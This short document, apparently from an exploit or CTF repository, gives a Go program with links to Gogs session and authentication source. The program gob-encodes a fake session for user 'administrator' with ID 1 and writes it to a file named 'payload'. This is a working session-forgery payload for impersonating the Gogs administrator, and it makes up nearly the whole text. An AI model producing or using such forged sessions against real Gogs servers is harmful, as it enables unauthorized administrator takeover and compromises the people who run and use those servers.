## CODE EXAMPLES

### CLI
- `go run file.go`


### ENCRYPT SESSION
- Based on the source code of **Gogs**
  - [Session/utils.go](https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/vendor/github.com/go-macaron/session/utils.go#L38-L45) 
  - [models/user.go](https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/models/user.go#L50-L52)
  - [routes/user/auth.go](https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/routes/user/auth.go#L127-L128)
- user name: administrator
- user ID: 1
```
package main

import (
  "bytes"
  "encoding/gob"
  "io/ioutil"
  "fmt"
)  

func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
  for _, v := range obj {
    gob.Register(v)
  }
  buf := bytes.NewBuffer(nil)
  err := gob.NewEncoder(buf).Encode(obj)
  return buf.Bytes(), err
}


func main() {
  var data []byte
  var kv = make(map[interface{}]interface{})
  kv["uname"]= "administrator"
  kv["uid"]= int64(1)
  fmt.Println(kv) 

  data, err := EncodeGob(kv);
  if err !=nil { 
    fmt.Println(err)
  }
  ioutil.WriteFile("payload", data, 0644)

}
```
